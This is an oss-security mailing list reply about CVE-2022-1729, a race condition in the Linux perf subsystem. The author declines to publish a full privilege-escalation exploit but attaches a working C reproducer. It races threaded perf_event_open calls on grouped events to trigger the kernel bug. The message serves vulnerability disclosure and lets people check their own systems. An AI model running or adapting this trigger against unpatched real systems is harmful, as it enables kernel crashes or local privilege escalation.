Received: (qmail 7678 invoked by uid 550); 24 May 2022 22:20:56 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 7641 invoked from network); 24 May 2022 22:20:56 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=gmx.net;
	s=badeba3b8450; t=1653430845;
	bh=yTLu/9NNf8Oo7KvjtNV9h9BsMXX0UjKPRKNU7Hbs6H8=;
	h=X-UI-Sender-Class:From:To:Cc:Subject:Date:In-Reply-To:References;
	b=T23jiAhAyQhMwigmMPdifkbmFFnoS0ke+UCDKnaUCC1XuoOiEnAz915sp6tAEu2vw
	 YlaRo6W+X++dgMyHEgE5unUIWTvAQuerOX/bkSVjoR/K4yRKgrqrlkHXfI+7omiFdE
	 EMV1xyUVltSRd9HVPlollIRLgiN1azgcvX0iIifo=
X-UI-Sender-Class: 01bb95c1-4bf8-414a-932a-4f6e2808ef9c
MIME-Version: 1.0
Message-ID: <trinity-4c518dcc-751b-4893-82dc-b2f80734eb9d-1653430844824@3c-app-gmx-bap13>
From: Norbert Slusarek <nslusarek@gmx.net>
To: Solar Designer <solar@openwall.com>
Cc: oss-security@lists.openwall.com, peterz@infradead.org
Content-Type: multipart/mixed;
 boundary=abmob-064f6272-15ee-4ba5-9db7-e2adb1983c38
Date: Wed, 25 May 2022 00:20:44 +0200
Importance: normal
Sensitivity: Normal
In-Reply-To: <20220521154759.GA15268@openwall.com>
References: <trinity-5f3c0fdf-d83f-422e-9a05-c4ead66e42e1-1653077676864@3c-app-gmx-bap52>
 <20220521154759.GA15268@openwall.com>
X-UI-Message-Type: mail
X-Priority: 3
X-Provags-ID: V03:K1:5hO0PGjotssmtbmQMUnM+TX9jW4+6NcSeDNnGBj5If/TcDbdGuqGEyMlEiB40SxwhjtR0
 ZrpbJNwEy+lrNWGUox5i/u3NagOcWS3JFTNM3/r5bXFGq8HAKxH9WyEcqf3M/oDNTnMElaIXiaEL
 IN3dAawVtnNjDtvMxVtBH8qmBO/Jp5cPQCznbyrElAnHcDdyvUxq7VN8mhitNJqTUut+X9vL22By
 l7BqIBEwNuIbZAHpBnvT3tJ7L20jXeQWNX4EbAaiiGSRPXsAYd888KCz+2FRGtdnK7jPsdfmVdGg
 8A=
X-UI-Out-Filterresults: notjunk:1;V03:K0:h24cfEgk/LM=:sOSFrsRoRoeWv75S5M+NID
 aG3CSClmZiJuCgiGrJpSdixEpwNYcczjs2YwhAMcmcYaiB0WvaXuaC0JQq1VnvDfSSWeT4A3E
 KO9hlrY5OoklXmSIJNQtXEpktg0z9E9ubB4k4GFG/E9JEkeS3I3M744jShBwD80Yvsl+LxF1p
 OieRYyJTB235vOK12B1AbZpeT6Yajw5rvKBjCSIN8HnLfAO08uXuee2TSzL1CqXiV6OEmIHLA
 T4hctIZokRl+uTlEEaH3uyOqhs7XOfceKVXvD9fQMZOYIiIuuIohn/GYtTq79SCvouE48EdVR
 tpSbbUnDrngjPzY9tqeHJtn2CgOpQUZ/3TZNPcSjg4B1KWAlwvZ6LwOmDjDueGx4GvPrkeFIf
 KfmvVheaUq8XrZiCW5uO/o57p7EGPfgoYtiURCE925DC8U4oR39uB3fTX7f3Ge+IroOZjy53W
 iEzhEptvDUj0AxkMCiEs6DJ8EQmlr77GoKHZWnOw6NBZv3w7ndz5SWOrjqWS4603Ya/QrdY8b
 FwrbPVA4hXBwDfRaeyiiksmvEsn66XMD3lgJos1sNuXcwP0XYz/Eh9UfUQnkpI1Sm5ZVoD2wH
 xA1GmMXaNSuPdqdRpiWIwU5M5GwaPG+iHfKuJuhEGs5Na5vYySGYyKCcFzZPKLL/31YeS+8n7
 Efu1iTP6Msilrrx5yNoJmX4h/V/H8SwhzW7SPnr/bv2Lc1YW82RmmnOyAmETu/TTXiriEb4hg
 SwexOTXetKGQnuwzegl9i66j+bfAmAZ1XTWplpWJyCEqTNKgeXjrQ1KRfruPazxRzJxHL4OC2
 o7P2ME3
Subject: Re: [oss-security] CVE-2022-1729: race condition in Linux perf
 subsystem leads to local privilege escalation

--abmob-064f6272-15ee-4ba5-9db7-e2adb1983c38
Content-Type: text/plain; charset=UTF-8

Hello Alexander,

>Since you shared actual exploit code on linux-distros, you're supposed
>to also post that to oss-security within 7 days of your first posting
>above, so by or on May 27. Do you intend to?

I don't intend to share the exploit to the public, mainly because
the issue was fixed only few days ago. Instead, anyone wanting to check
his own system for the bug should resort to the attached PoC repro.

>I realize this is one of the aspects that not everyone is happy about.

Yes, you got that right.


Norbert
--abmob-064f6272-15ee-4ba5-9db7-e2adb1983c38
Content-Type: text/plain
Content-Disposition: attachment; filename=repro.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>

pid_t pid;
int ev_trace, ev_hard, ev_soft;

void setup_trace(void)
{
	struct perf_event_attr attr;

	memset(&attr, 0, sizeof(attr));
	attr.type = PERF_TYPE_TRACEPOINT;
	attr.config = 0xc6;
	attr.exclude_kernel = 1;
	attr.exclude_hv = 1;

	ev_trace = syscall(__NR_perf_event_open, &attr, pid, -1, -1, 0);
}

void *thread_hard(void *arg)
{
	struct perf_event_attr attr;

	memset(&attr, 0, sizeof(attr));
	attr.type = PERF_TYPE_HARDWARE;
	attr.exclude_kernel = 1;
	attr.exclude_hv = 1;

	ev_hard = syscall(__NR_perf_event_open, &attr, pid, -1, ev_trace, 0);

	return NULL;
}

void *thread_soft(void *arg)
{
	struct perf_event_attr attr;

	memset(&attr, 0, sizeof(attr));
	attr.type = PERF_TYPE_SOFTWARE;
	attr.exclude_kernel = 1;
	attr.exclude_hv = 1;

	ev_soft = syscall(__NR_perf_event_open, &attr, pid, -1, ev_trace, 0);

	return NULL;
}

void hard_event_independent(void)
{
	struct perf_event_attr attr;

	memset(&attr, 0, sizeof(attr));
	attr.type = PERF_TYPE_HARDWARE;
	attr.exclude_kernel = 1;
	attr.exclude_hv = 1;

	syscall(__NR_perf_event_open, &attr, pid, -1, -1, 0);
}

int main(int argc, char **argv)
{
	pthread_t th[2];

	pid = fork();
	if (pid == 0) {
		sleep(9999);
		exit(EXIT_SUCCESS);
	}

	setup_trace();

	pthread_create(&th[0], 0, thread_hard, 0);
	pthread_create(&th[1], 0, thread_soft, 0);

	pthread_join(th[0], 0);
	pthread_join(th[1], 0);

	close(ev_trace);
	close(ev_hard);
	close(ev_soft);

	hard_event_independent();

	return 0;
}

--abmob-064f6272-15ee-4ba5-9db7-e2adb1983c38--

